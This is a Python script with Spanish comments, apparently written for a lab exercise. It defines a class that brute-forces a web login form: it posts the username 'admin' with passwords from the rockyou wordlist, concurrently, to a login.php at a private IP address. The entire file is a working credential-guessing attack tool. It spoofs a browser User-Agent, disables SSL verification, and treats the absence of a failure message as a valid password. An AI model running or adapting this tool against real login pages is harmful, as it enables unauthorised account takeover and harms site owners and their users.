import asyncio
import aiohttp
from colorama import init, Fore
from tqdm.asyncio import tqdm

# Inicializa colorama para el manejo de colores en la terminal
init(autoreset=True)

# Colores para la salida en la terminal
GREEN = Fore.GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW

class PasswordGuesser:
    """Clase para realizar ataques de fuerza bruta a un formulario de login.

    Args:
        target_url (str): URL del formulario de login.
        username (str): Nombre de usuario a probar.
        wordlist_path (str): Ruta del archivo con la lista de passwords.
        action_type (str): Tipo de acción del formulario.
        timeout (int, optional): Tiempo de espera máximo para la respuesta del servidor. Por defecto es 5.
        verify_ssl (bool, optional): Verificar SSL en la conexión. Por defecto es False.
    """

    def __init__(self, target_url, username, wordlist_path, action_type, timeout=5, verify_ssl=False):
        self.target_url = target_url
        self.username = username
        self.wordlist_path = wordlist_path
        self.action_type = action_type
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"

    async def run_guess(self):
        """Ejecuta el proceso de adivinanza de passwords."""
        passwords = self.load_passwords()
        semaphore = asyncio.Semaphore(20)
        async with aiohttp.ClientSession(
            headers={'User-Agent': self.user_agent},
            connector=aiohttp.TCPConnector(ssl=self.verify_ssl)
        ) as session:
            tasks = []
            for password in tqdm(passwords[:1000], desc="Probando passwords", unit="password"):
                task = asyncio.create_task(self.try_password(session, password, semaphore))
                tasks.append(task)
            results = await asyncio.gather(*tasks)
            # Imprimir si se encontró una password válida
            if any(results):
                print(f"{GREEN} [+] Password encontrada: {next((res for res in results if res), 'No se ha encontrado password')}{Fore.RESET}")
            else:
                print(f"{RED} [-] No se han encontrado passwords válidas.{Fore.RESET}")

    async def try_password(self, session, password, semaphore):
        """Intenta probar una password en el formulario de login.

        Args:
            session (aiohttp.ClientSession): Sesión HTTP para realizar la solicitud.
            password (str): Password a probar.
            semaphore (asyncio.Semaphore): Semáforo para controlar la concurrencia.

        Returns:
            str or None: La password si es válida, de lo contrario None.
        """
        async with semaphore:
            try:
                parameters = {"login": self.username, "password": password, "form": self.action_type}
                response = await session.post(self.target_url, data=parameters, timeout=aiohttp.ClientTimeout(total=self.timeout))
                content = await response.text()
                if 'Invalid credentials or user not activated'.lower() not in content.lower():
                    return password
            except Exception as e:
                print(f"Error probando la password {password}: {e}")
            return None

    def load_passwords(self):
        """Carga la lista de passwords desde el archivo especificado.

        Returns:
            list: Lista de passwords.
        """
        with open(self.wordlist_path, 'r', encoding='latin-1') as file:
            return [line.strip() for line in file]

    def start_guessing(self):
        """Inicia el proceso de adivinar passwords."""
        print(f"{YELLOW}Comenzando el proceso de adivinar passwords contra '{self.target_url}' con el usuario '{self.username}'{Fore.RESET}")
        asyncio.run(self.run_guess())

if __name__ == "__main__":
    # Inicializa el PasswordGuesser con los parámetros necesarios y comienza el proceso de adivinanza
    guesser = PasswordGuesser(
        target_url="http://192.168.138.129:8080/login.php",
        username="admin",
        wordlist_path="/usr/share/wordlists/rockyou.txt",
        action_type="submit",
        verify_ssl=False
    )
    guesser.start_guessing()
